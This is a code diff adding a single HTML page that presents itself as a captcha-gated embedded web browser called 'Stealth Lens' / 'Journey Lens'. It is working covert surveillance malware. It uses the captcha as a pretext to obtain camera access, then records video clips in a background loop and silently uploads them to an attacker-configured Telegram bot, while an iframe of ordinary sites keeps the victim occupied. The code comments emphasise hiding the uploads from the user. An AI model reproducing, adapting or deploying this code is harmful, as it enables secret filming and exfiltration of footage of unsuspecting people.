@@ -1,0 +1,731 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
+  <title>Stealth Lens • Auto Background Capture</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: system-ui, 'Segoe UI', 'Inter', -apple-system, BlinkMacSystemFont, 'Roboto', sans-serif;
+    }
+
+    body {
+      background: linear-gradient(145deg, #0a0f1e 0%, #0c1222 100%);
+      margin: 0;
+      padding: 20px;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      overflow-x: hidden;
+    }
+
+    .glass-panel {
+      max-width: 1400px;
+      width: 100%;
+      background: rgba(18, 25, 45, 0.75);
+      backdrop-filter: blur(14px);
+      border-radius: 2rem;
+      border: 1px solid rgba(72, 187, 255, 0.30);
+      box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.6);
+      overflow: hidden;
+      padding: 1.5rem;
+      transition: all 0.2s ease;
+    }
+
+    .hidden { display: none !important; }
+
+    /* GATE SCREEN (captcha only) */
+    #gateScreen {
+      max-width: 460px;
+      text-align: center;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 1.2rem;
+      margin: auto;
+    }
+
+    #gateScreen h1 {
+      font-size: 1.8rem;
+      background: linear-gradient(135deg, #E0F2FE, #38BDF8);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+      margin-bottom: 0;
+    }
+
+    #gateScreen p {
+      color: #94a3b8;
+      font-size: 0.9rem;
+      margin: 0;
+    }
+
+    .captcha-container {
+      background: rgba(12, 20, 30, 0.75);
+      padding: 1.25rem;
+      border-radius: 1.5rem;
+      border: 1px solid rgba(56, 189, 248, 0.3);
+      width: 100%;
+    }
+
+    .captcha-display {
+      display: flex;
+      gap: 12px;
+      justify-content: center;
+      align-items: center;
+      margin-bottom: 1rem;
+    }
+
+    canvas#captchaCanvas {
+      background: #0f172a;
+      border-radius: 1rem;
+      border: 1px solid #2d3e60;
+      letter-spacing: 3px;
+    }
+
+    .refresh-btn {
+      background: #1e2a3e;
+      border: 1px solid #334155;
+      color: #38bdf8;
+      font-size: 1.3rem;
+      width: 48px;
+      height: 48px;
+      border-radius: 1rem;
+      cursor: pointer;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      transition: 0.2s;
+    }
+
+    .refresh-btn:hover { background: #283a54; transform: rotate(10deg);}
+
+    input#captchaInput {
+      width: 100%;
+      background: #0f172a;
+      border: 1px solid #334155;
+      padding: 12px;
+      border-radius: 1rem;
+      color: white;
+      font-size: 1rem;
+      text-align: center;
+      letter-spacing: 2px;
+    }
+
+    input#captchaInput:focus { border-color: #38bdf8; outline: none; }
+
+    #grantEnterBtn {
+      background: linear-gradient(105deg, #0f2b3d, #0e2a44);
+      border: 1px solid #38bdf8;
+      width: 100%;
+      padding: 12px;
+      border-radius: 2rem;
+      font-weight: 600;
+      color: #b9f2ff;
+      cursor: pointer;
+      transition: 0.2s;
+    }
+
+    #grantEnterBtn:disabled { opacity: 0.5; cursor: not-allowed; }
+
+    /* MAIN APP : Only webview + minimal top bar (NO DASHBOARD, NO GALLERY, NO LOGS) */
+    .app-main-layout {
+      display: flex;
+      flex-direction: column;
+      gap: 1rem;
+    }
+
+    .top-bar {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      background: rgba(12, 20, 30, 0.5);
+      border-radius: 1.5rem;
+      padding: 0.75rem 1.2rem;
+      border: 1px solid rgba(56, 189, 248, 0.2);
+    }
+
+    .app-title {
+      font-size: 1.3rem;
+      font-weight: 600;
+      background: linear-gradient(135deg, #E0F2FE, #7DD3FC);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+      margin: 0;
+    }
+
+    .capture-control {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      background: #0f172a80;
+      padding: 5px 12px;
+      border-radius: 3rem;
+      backdrop-filter: blur(4px);
+    }
+
+    .stat-badge {
+      background: #1e2a3e;
+      padding: 4px 10px;
+      border-radius: 2rem;
+      font-size: 0.7rem;
+      font-weight: 500;
+      color: #b9f2ff;
+      font-family: monospace;
+    }
+
+    .toggle-capture-btn {
+      background: #1e2a3e;
+      border: none;
+      color: #facc15;
+      font-size: 1rem;
+      padding: 6px 16px;
+      border-radius: 2rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: 0.2s;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      border: 1px solid #facc1533;
+    }
+
+    .toggle-capture-btn.active {
+      background: #facc1522;
+      border-color: #facc15;
+      color: #fde047;
+    }
+
+    .toggle-capture-btn:hover { background: #2a3a55; transform: scale(0.97);}
+
+    .hamburger-icon {
+      background: none;
+      border: none;
+      color: #38bdf8;
+      font-size: 1.7rem;
+      cursor: pointer;
+      padding: 0 8px;
+      line-height: 1;
+    }
+
+    /* webview container */
+    .webview-container {
+      width: 100%;
+      height: 70vh;
+      min-height: 500px;
+      background: #0f172a;
+      border-radius: 1.5rem;
+      overflow: hidden;
+      border: 1px solid #38bdf8;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .webview-header-inline {
+      background: #0a0f1ecc;
+      padding: 10px 16px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 1px solid #334155;
+      backdrop-filter: blur(4px);
+    }
+
+    .webview-header-inline span {
+      color: #bbe2ff;
+      font-weight: 500;
+      font-size: 0.85rem;
+    }
+
+    .close-webview-btn {
+      background: #334155;
+      color: white;
+      border: none;
+      padding: 4px 14px;
+      border-radius: 2rem;
+      cursor: pointer;
+      font-size: 0.75rem;
+    }
+
+    .close-webview-btn:hover { background: #f97316; }
+
+    iframe#appIframe {
+      width: 100%;
+      flex: 1;
+      border: none;
+      background: #fff;
+    }
+
+    /* SIDEBAR MENU (unchanged) */
+    .sidebar-overlay {
+      position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+      background: rgba(0,0,0,0.7); z-index: 99; opacity: 0; pointer-events: none; transition: 0.3s;
+    }
+    .sidebar-overlay.active { opacity: 1; pointer-events: all; }
+    
+    .sidebar {
+      position: fixed; top: 0; right: -320px; width: 300px; height: 100vh;
+      background: #0f172a; border-left: 1px solid #38bdf8; z-index: 100;
+      transition: right 0.3s ease; padding: 20px; display: flex; flex-direction: column;
+    }
+    .sidebar.open { right: 0; }
+    .sidebar-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #334155; padding-bottom: 10px; margin-bottom: 15px; }
+    .sidebar h2 { color: #b9f2ff; margin: 0; font-size: 1.2rem; }
+    .close-menu { background: none; border: none; color: #f97316; font-size: 1.5rem; cursor: pointer; }
+    
+    .menu-list { list-style: none; padding: 0; margin: 0; display: flex; flex-direction: column; gap: 10px; }
+    .menu-list li {
+      background: #1e293b; padding: 12px 15px; border-radius: 0.8rem; cursor: pointer;
+      color: #e2e8f0; font-size: 0.95rem; border: 1px solid #334155; transition: 0.2s;
+    }
+    .menu-list li:hover { background: #283a54; border-color: #38bdf8; }
+
+    /* no logs, no gallery, no dashboard garbage */
+    ::-webkit-scrollbar { width: 5px; }
+    ::-webkit-scrollbar-track { background: #0f172a; }
+    ::-webkit-scrollbar-thumb { background: #2c4a6e; border-radius: 10px; }
+
+    @media (max-width: 780px) {
+      body { padding: 12px; }
+      .glass-panel { padding: 1rem; }
+      .webview-container { height: 60vh; min-height: 380px; }
+    }
+  </style>
+</head>
+<body>
+
+<!-- GATE SCREEN (CAPTCHA + PERMISSIONS) -->
+<div id="gateScreen" class="glass-panel">
+  <h1>📡 Journey Lens</h1>
+  <p>Security verification · background capture · embed explorer</p>
+  <div class="captcha-container">
+    <div class="captcha-display">
+      <canvas id="captchaCanvas" width="180" height="50"></canvas>
+      <button class="refresh-btn" id="refreshCaptchaBtn" title="New code">↻</button>
+    </div>
+    <input type="text" id="captchaInput" placeholder="Enter code" autocomplete="off">
+    <div id="captchaStatusMsg" style="font-size: 0.75rem; margin-top: 8px; min-height: 18px;"></div>
+  </div>
+  <p id="cameraErrorMsg" style="color: #f97316; font-size: 0.8rem; display: none;">⚠️ Camera permission required</p>
+  <button id="grantEnterBtn" disabled>✅ Verify & Launch</button>
+</div>
+
+<!-- MAIN APPLICATION (PURE WEBVIEW + BACKGROUND CAPTURE) -->
+<div id="mainApp" class="glass-panel hidden">
+  <div class="app-main-layout">
+    <!-- Minimal top bar: no logs, no dashboard controls except capture toggle + hamburger -->
+    <div class="top-bar">
+      <div class="app-title">📸 Stealth Lens</div>
+      <div class="capture-control">
+        <span class="stat-badge" id="sentCounterBadge">📤 sent: 0</span>
+        <button id="captureToggleBtn" class="toggle-capture-btn active">⏺️ ACTIVE</button>
+        <button id="menuBtnSide" class="hamburger-icon" title="Web Apps Menu">☰</button>
+      </div>
+    </div>
+
+    <!-- EMBEDDED WEBVIEW (main interface) -->
+    <div id="webviewMainContainer" class="webview-container">
+      <div class="webview-header-inline">
+        <span id="webviewTitle">🌐 Embedded Browser</span>
+        <button class="close-webview-btn" id="closeWebviewBtn">⬅ Reset to default</button>
+      </div>
+      <iframe id="appIframe" src="about:blank" title="Web Apps"></iframe>
+    </div>
+  </div>
+</div>
+
+<!-- SIDEBAR MENU (Web Apps) -->
+<div class="sidebar-overlay" id="sidebarOverlay"></div>
+<div class="sidebar" id="sideMenu">
+  <div class="sidebar-header">
+    <h2>🔗 Web Apps</h2>
+    <button class="close-menu" id="closeMenuBtn">✖</button>
+  </div>
+  <ul class="menu-list" id="menuList"></ul>
+</div>
+
+<script>
+  // ============================================================
+  // 🧩 CONFIGURATION (EDIT WITH YOUR TELEGRAM CREDENTIALS)
+  // ============================================================
+  const CONFIG = {
+    // 1. Your Telegram Bot Token (from BotFather)
+    BOT_TOKEN: "7312345678:AAGx...your_bot_token",   // <-- REPLACE with real token
+    // 2. Your Telegram Chat ID (group/channel where bot is admin)
+    CHAT_ID: "-1001234567890",                       // <-- REPLACE with real chat id
+    // 3. Caption for each video sent to Telegram
+    VIDEO_DESCRIPTION: "📸 Background memory capture",
+    // 4. Duration of each video clip (seconds)
+    CAPTURE_INTERVAL_SECONDS: 5,
+    // 5. Max videos to record (0 = unlimited, set number e.g., 20)
+    MAX_VIDEOS: 20,
+    // 6. Embedded web apps (appears in hamburger menu)
+    EMBED_LINKS: [
+      { name: "Wikipedia", url: "https://en.wikipedia.org" },
+      { name: "Bing Search", url: "https://www.bing.com" },
+      { name: "GitHub", url: "https://github.com" },
+      { name: "Neumorphism UI", url: "https://neumorphism.io/" }
+    ]
+  };
+  // ============================================================
+
+  // ---------- DOM elements ----------
+  const gateScreen = document.getElementById('gateScreen');
+  const mainApp = document.getElementById('mainApp');
+  const captchaCanvas = document.getElementById('captchaCanvas');
+  const ctx = captchaCanvas.getContext('2d');
+  const captchaInput = document.getElementById('captchaInput');
+  const refreshCaptchaBtn = document.getElementById('refreshCaptchaBtn');
+  const captchaStatusMsg = document.getElementById('captchaStatusMsg');
+  const grantEnterBtn = document.getElementById('grantEnterBtn');
+  const cameraErrorSpan = document.getElementById('cameraErrorMsg');
+
+  // background camera elements
+  const hiddenCameraVideo = document.createElement('video');
+  hiddenCameraVideo.autoplay = true;
+  hiddenCameraVideo.playsInline = true;
+  hiddenCameraVideo.muted = true;
+  hiddenCameraVideo.style.display = 'none';
+  document.body.appendChild(hiddenCameraVideo);
+
+  // UI top bar dynamic
+  const sentCounterBadge = document.getElementById('sentCounterBadge');
+  const captureToggleBtn = document.getElementById('captureToggleBtn');
+  const menuBtnSide = document.getElementById('menuBtnSide');
+  const sideMenu = document.getElementById('sideMenu');
+  const sidebarOverlay = document.getElementById('sidebarOverlay');
+  const closeMenuBtn = document.getElementById('closeMenuBtn');
+  const menuList = document.getElementById('menuList');
+  const webviewTitleSpan = document.getElementById('webviewTitle');
+  const appIframe = document.getElementById('appIframe');
+  const closeWebviewBtn = document.getElementById('closeWebviewBtn');
+
+  // State variables
+  let mediaStream = null;
+  let isCaptureActive = false;       // background recording loop flag
+  let segmentCounter = 0;            // number of clips sent/recorded
+  let currentLoopPromise = null;
+  let stopLoopRequest = false;
+  let maxVideosReached = false;
+
+  // helper: update sent badge
+  function updateSentBadge() {
+    sentCounterBadge.innerText = `📤 sent: ${segmentCounter}${CONFIG.MAX_VIDEOS > 0 ? ` / ${CONFIG.MAX_VIDEOS}` : ''}`;
+    if (CONFIG.MAX_VIDEOS > 0 && segmentCounter >= CONFIG.MAX_VIDEOS) {
+      if (!maxVideosReached) {
+        maxVideosReached = true;
+        if (isCaptureActive) stopCaptureInternal(true);
+        captureToggleBtn.classList.remove('active');
+        captureToggleBtn.innerHTML = '⏹️ LIMIT REACHED';
+        captureToggleBtn.disabled = true;
+      }
+    }
+  }
+
+  // ---------- Telegram sender (silent, no interface logs) ----------
+  async function sendVideoToTelegram(videoBlob, clipNumber) {
+    if (!CONFIG.BOT_TOKEN || !CONFIG.CHAT_ID || CONFIG.BOT_TOKEN.includes("your_bot_token") || CONFIG.CHAT_ID.includes("-100")) {
+      // silently ignore, no UI log (as per requirement: no log messages)
+      return false;
+    }
+    try {
+      const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendVideo`;
+      const formData = new FormData();
+      formData.append('chat_id', CONFIG.CHAT_ID);
+      formData.append('video', videoBlob, `lens_capture_${Date.now()}_${clipNumber}.webm`);
+      const captionText = `${CONFIG.VIDEO_DESCRIPTION}\n🎬 Clip #${clipNumber}`;
+      formData.append('caption', captionText);
+      const response = await fetch(url, { method: 'POST', body: formData });
+      const result = await response.json();
+      // No UI logs, just console (invisible for user)
+      if (!result.ok) console.warn("Telegram send error:", result.description);
+      return result.ok;
+    } catch (err) {
+      console.error("Telegram send exception:", err);
+      return false;
+    }
+  }
+
+  // ---------- Background video recording (single segment) ----------
+  async function recordSingleSegment(segmentId) {
+    if (!mediaStream || !isCaptureActive || (CONFIG.MAX_VIDEOS > 0 && segmentCounter >= CONFIG.MAX_VIDEOS)) {
+      return false;
+    }
+    return new Promise(async (resolve) => {
+      let mediaRecorder;
+      const chunks = [];
+      const mimeType = ['video/webm;codecs=vp9,opus', 'video/webm;codecs=vp8,opus', 'video/webm'].find(t => MediaRecorder.isTypeSupported(t)) || 'video/webm';
+      try {
+        mediaRecorder = new MediaRecorder(mediaStream, { mimeType, videoBitsPerSecond: 800000 });
+      } catch (err) {
+        // failure, resolve false
+        resolve(false);
+        return;
+      }
+      mediaRecorder.ondataavailable = (e) => { if (e.data && e.data.size > 0) chunks.push(e.data); };
+      mediaRecorder.onstop = async () => {
+        if (!isCaptureActive || chunks.length === 0 || (CONFIG.MAX_VIDEOS > 0 && segmentCounter >= CONFIG.MAX_VIDEOS)) {
+          resolve(false);
+          return;
+        }
+        const videoBlob = new Blob(chunks, { type: mimeType || 'video/webm' });
+        // Send to Telegram (silent)
+        await sendVideoToTelegram(videoBlob, segmentId);
+        segmentCounter++;
+        updateSentBadge();
+        resolve(true);
+      };
+      mediaRecorder.start(1000);
+      setTimeout(() => {
+        if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
+      }, CONFIG.CAPTURE_INTERVAL_SECONDS * 1000);
+    });
+  }
+
+  // ---------- Background capture loop (auto-recursive) ----------
+  async function runCaptureLoop() {
+    while (isCaptureActive && !stopLoopRequest) {
+      if (CONFIG.MAX_VIDEOS > 0 && segmentCounter >= CONFIG.MAX_VIDEOS) {
+        // limit reached → stop capture gracefully
+        if (isCaptureActive) stopCaptureInternal(true);
+        break;
+      }
+      if (!mediaStream || mediaStream.getTracks().some(t => t.readyState === 'ended')) {
+        // camera lost → break loop and set inactive
+        if (isCaptureActive) stopCaptureInternal(true);
+        break;
+      }
+      const nextId = segmentCounter + 1;
+      await recordSingleSegment(nextId);
+      if (isCaptureActive && !stopLoopRequest) await new Promise(r => setTimeout(r, 350));
+    }
+  }
+
+  function startCaptureLoop() {
+    if (stopLoopRequest) stopLoopRequest = false;
+    if (!isCaptureActive) return;
+    if (CONFIG.MAX_VIDEOS > 0 && segmentCounter >= CONFIG.MAX_VIDEOS) {
+      stopCaptureInternal(true);
+      return;
+    }
+    runCaptureLoop().catch(() => {});
+  }
+
+  function stopCaptureInternal(keepToggleState = false) {
+    if (!isCaptureActive) return;
+    isCaptureActive = false;
+    stopLoopRequest = true;
+    if (!keepToggleState) {
+      captureToggleBtn.classList.remove('active');
+      captureToggleBtn.innerHTML = '⏸️ START CAPTURE';
+    }
+  }
+
+  function startCapture() {
+    if (maxVideosReached) return;
+    if (CONFIG.MAX_VIDEOS > 0 && segmentCounter >= CONFIG.MAX_VIDEOS) {
+      maxVideosReached = true;
+      captureToggleBtn.disabled = true;
+      captureToggleBtn.innerHTML = '⏹️ LIMIT REACHED';
+      return;
+    }
+    if (isCaptureActive) return;
+    if (!mediaStream || mediaStream.getTracks().some(t => t.readyState === 'ended')) {
+      // no camera stream -> can't start
+      return;
+    }
+    isCaptureActive = true;
+    stopLoopRequest = false;
+    captureToggleBtn.classList.add('active');
+    captureToggleBtn.innerHTML = '⏺️ ACTIVE';
+    startCaptureLoop();
+  }
+
+  function toggleCapture() {
+    if (maxVideosReached) return;
+    if (isCaptureActive) {
+      stopCaptureInternal(false);
+    } else {
+      startCapture();
+    }
+  }
+
+  // ---------- Webview & sidebar logic ----------
+  function populateMenu() {
+    menuList.innerHTML = '';
+    CONFIG.EMBED_LINKS.forEach(link => {
+      const li = document.createElement('li');
+      li.textContent = `🌐 ${link.name}`;
+      li.onclick = () => {
+        openWebview(link.name, link.url);
+        toggleMenu(false);
+      };
+      menuList.appendChild(li);
+    });
+  }
+
+  function openWebview(name, url) {
+    webviewTitleSpan.textContent = name;
+    appIframe.src = url;
+  }
+
+  function closeWebviewToDefault() {
+    webviewTitleSpan.textContent = "🌐 Embedded Browser";
+    appIframe.src = "about:blank";
+  }
+
+  function toggleMenu(show) {
+    if (show) {
+      sideMenu.classList.add('open');
+      sidebarOverlay.classList.add('active');
+    } else {
+      sideMenu.classList.remove('open');
+      sidebarOverlay.classList.remove('active');
+    }
+  }
+
+  // ---------- CAPTCHA logic ----------
+  let currentCaptchaText = "";
+  function generateCaptcha() {
+    ctx.clearRect(0, 0, captchaCanvas.width, captchaCanvas.height);
+    ctx.fillStyle = "#0f172a";
+    ctx.fillRect(0, 0, captchaCanvas.width, captchaCanvas.height);
+    const chars = "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789";
+    currentCaptchaText = "";
+    for (let i = 0; i < 5; i++) currentCaptchaText += chars.charAt(Math.floor(Math.random() * chars.length));
+    ctx.font = "bold 26px 'Courier New', monospace";
+    ctx.textBaseline = "middle";
+    for (let i = 0; i < currentCaptchaText.length; i++) {
+      ctx.save();
+      const xPos = 25 + (i * 28);
+      const yPos = captchaCanvas.height / 2;
+      const angle = (Math.random() - 0.5) * 0.5;
+      ctx.translate(xPos, yPos);
+      ctx.rotate(angle);
+      const colors = ["#38bdf8", "#7dd3fc", "#bae6fd", "#e0f2fe"];
+      ctx.fillStyle = colors[Math.floor(Math.random() * colors.length)];
+      ctx.fillText(currentCaptchaText[i], -10, 0);
+      ctx.restore();
+    }
+    for (let i = 0; i < 3; i++) {
+      ctx.beginPath();
+      ctx.moveTo(Math.random() * captchaCanvas.width, Math.random() * captchaCanvas.height);
+      ctx.lineTo(Math.random() * captchaCanvas.width, Math.random() * captchaCanvas.height);
+      ctx.strokeStyle = `rgba(255, 255, 255, 0.3)`;
+      ctx.lineWidth = 1.2;
+      ctx.stroke();
+    }
+    captchaInput.value = "";
+    checkCaptcha();
+  }
+
+  function checkCaptcha() {
+    const userInput = captchaInput.value.trim().toLowerCase();
+    const correct = currentCaptchaText.toLowerCase();
+    if (userInput.length === 0) {
+      captchaStatusMsg.textContent = "";
+      grantEnterBtn.disabled = true;
+    } else if (userInput === correct) {
+      captchaStatusMsg.innerHTML = "✅ Verified";
+      captchaStatusMsg.style.color = "#34d399";
+      grantEnterBtn.disabled = false;
+    } else if (userInput.length >= 5) {
+      captchaStatusMsg.innerHTML = "❌ Wrong code";
+      captchaStatusMsg.style.color = "#f97316";
+      grantEnterBtn.disabled = true;
+    } else {
+      captchaStatusMsg.innerHTML = "";
+      grantEnterBtn.disabled = true;
+    }
+  }
+
+  // ---------- Camera & Main Entry (Auto-start capture after CAPTCHA) ----------
+  async function requestCameraAndEnter() {
+    grantEnterBtn.textContent = "🎥 Requesting camera...";
+    grantEnterBtn.disabled = true;
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+      mediaStream = stream;
+      hiddenCameraVideo.srcObject = stream;
+      cameraErrorSpan.style.display = "none";
+      
+      // Hidden: Success. Hide gate, show mainApp (only webview + minimal ui)
+      gateScreen.classList.add('hidden');
+      mainApp.classList.remove('hidden');
+      
+      // Reset state before capture (fresh start)
+      segmentCounter = 0;
+      maxVideosReached = false;
+      stopLoopRequest = false;
+      isCaptureActive = false;  // ensure stopped, then start fresh
+      updateSentBadge();
+      captureToggleBtn.disabled = false;
+      captureToggleBtn.innerHTML = '⏺️ ACTIVE';
+      captureToggleBtn.classList.remove('active');
+      
+      // Automatically start background capture
+      isCaptureActive = true;
+      captureToggleBtn.classList.add('active');
+      startCaptureLoop();   // start loop automatically
+      
+      // Set default webview content (first link if available)
+      if (CONFIG.EMBED_LINKS.length > 0) {
+        openWebview(CONFIG.EMBED_LINKS[0].name, CONFIG.EMBED_LINKS[0].url);
+      } else {
+        closeWebviewToDefault();
+      }
+      
+    } catch (err) {
+      cameraErrorSpan.style.display = 'block';
+      cameraErrorSpan.textContent = `⚠️ Camera error: ${err.message}`;
+      grantEnterBtn.textContent = "✅ Verify & Enter";
+      grantEnterBtn.disabled = false;
+    }
+  }
+
+  // Event Listeners
+  refreshCaptchaBtn.addEventListener('click', generateCaptcha);
+  captchaInput.addEventListener('input', checkCaptcha);
+  grantEnterBtn.addEventListener('click', () => {
+    if (!grantEnterBtn.disabled) {
+      requestCameraAndEnter();
+    }
+  });
+
+  // Toggle capture from minimal UI
+  captureToggleBtn.addEventListener('click', toggleCapture);
+  menuBtnSide.addEventListener('click', () => toggleMenu(true));
+  closeMenuBtn.addEventListener('click', () => toggleMenu(false));
+  sidebarOverlay.addEventListener('click', () => toggleMenu(false));
+  closeWebviewBtn.addEventListener('click', closeWebviewToDefault);
+  
+  // Cleanup on page unload
+  window.addEventListener('beforeunload', () => {
+    if (mediaStream) mediaStream.getTracks().forEach(track => track.stop());
+    if (hiddenCameraVideo.srcObject) hiddenCameraVideo.srcObject = null;
+  });
+  
+  // Initialize captcha and menu.
+  generateCaptcha();
+  populateMenu();
+  // preload default
+  closeWebviewToDefault();
+  
+  // ensure that if user re-enters camera after max limit, toggle reflects correctly
+  // extra: if camera stream lost (rare), stop capture gracefully
+  setInterval(() => {
+    if (mainApp && !mainApp.classList.contains('hidden')) {
+      if (mediaStream && mediaStream.getTracks().some(t => t.readyState === 'ended') && isCaptureActive) {
+        stopCaptureInternal(true);
+        captureToggleBtn.classList.remove('active');
+        captureToggleBtn.innerHTML = '⚠️ CAM LOST';
+        captureToggleBtn.disabled = true;
+      }
+    }
+  }, 3000);
+</script>
+</body>
+</html>
